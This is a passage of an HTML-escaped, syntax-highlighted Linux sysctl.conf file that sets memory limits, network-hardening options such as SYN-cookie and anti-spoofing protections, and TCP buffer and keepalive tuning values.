###\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Increase size of file handles and inode cache\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efs.file-max\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e2097152\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Insure we always have enough memory\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003evm.min_free_kbytes\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e8192\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Do less swapping\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003evm.swappiness\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003evm.dirty_ratio\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003evm.dirty_background_ratio\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e### GENERAL NETWORK SECURITY OPTIONS ###\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Avoid a smurf attack\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.icmp_echo_ignore_broadcasts\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Turn on protection for bad icmp error messages\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.icmp_ignore_bogus_error_responses\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Turn on syncookies for SYN flood attack protection\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_syncookies\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_max_syn_backlog\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e8192\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Turn on timestamping\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_timestamps\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Turn on and log spoofed, source routed, and redirect packets\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.conf.all.log_martians\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.conf.default.log_martians\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# No source routed packets here\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.conf.all.accept_source_route\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.conf.default.accept_source_route\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Turn on reverse path filtering\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.conf.all.rp_filter\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.conf.default.rp_filter\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Make sure no one can alter the routing tables\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.conf.all.accept_redirects\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.conf.default.accept_redirects\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.conf.all.secure_redirects\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.conf.default.secure_redirects\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Don\u0026#39;t act as a router\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.ip_forward\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.conf.all.send_redirects\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.conf.default.send_redirects\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Number of times SYNACKs for passive TCP connection.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_synack_retries\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Allowed local port range\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.ip_local_port_range\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1024 65000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Protect Against TCP Time-Wait\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_rfc1337\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Decrease the time default value for tcp_fin_timeout connection\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_fin_timeout\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e15\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Decrease the time default value for connections to keep alive\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_keepalive_time\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e300\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_keepalive_probes\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_keepalive_intvl\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e15\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# This means that the keepalive process waits 300 seconds for socket \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# activity before sending the first keepalive probe, and then resend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# it every 15 seconds. If no ACK response is received for 5 consecutive \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# times (75s in this case), the connection is marked as broken.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e### TUNING NETWORK PERFORMANCE ###\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Disable IPv6\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv6.conf.all.disable_ipv6\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv6.conf.default.disable_ipv6\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv6.conf.lo.disable_ipv6\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Default Socket Receive Buffer\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.core.rmem_default\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e31457280\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Maximum Socket Receive Buffer\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.core.rmem_max\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e12582912\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Default Socket Send Buffer\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.core.wmem_default\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e31457280\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Maximum Socket Send Buffer\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.core.wmem_max\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e12582912\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Increase number of incoming connections\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.core.somaxconn\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e5000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Increase number of incoming connections backlog\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.core.netdev_max_backlog\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e65536\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Enable TCP window scaling\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_window_scaling\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Increase the maximum amount of option memory buffers\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.core.optmem_max\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e25165824\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Increase the maximum total buffer-space allocatable\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# This is measured in units of pages (4096 bytes)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_mem\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e65536 131072 262144\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.udp_mem\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e65536 131072 262144\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Increase the read-buffer space allocatable\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_rmem\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e8192 87380 16777216\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.udp_rmem_min\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e16384\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Increase the write-buffer-space allocatable\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_wmem\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e8192 65536 16777216\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.udp_wmem_min\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e16384\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Increase the tcp-time-wait buckets pool size to prevent simple DOS attacks\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_max_tw_buckets\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1800000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# TIME_WAIT socket policy\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Note: if both enabled then disable\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# net.ipv4.tcp_timestamps for servers \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# behind NAT to prevent dropped incoming connections\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#net.ipv4.tcp_tw_recycle = 1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_tw_reuse\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Enable TCP MTU probing (in case of Jumbo Frames enabled)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#net.ipv4.tcp_mtu_probing = 1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Speedup retrans (Google recommended)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_slow_start_after_idle\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_early_retrans\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Conntrack\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 288bytes x 131072 = 37748736 (~38MB) 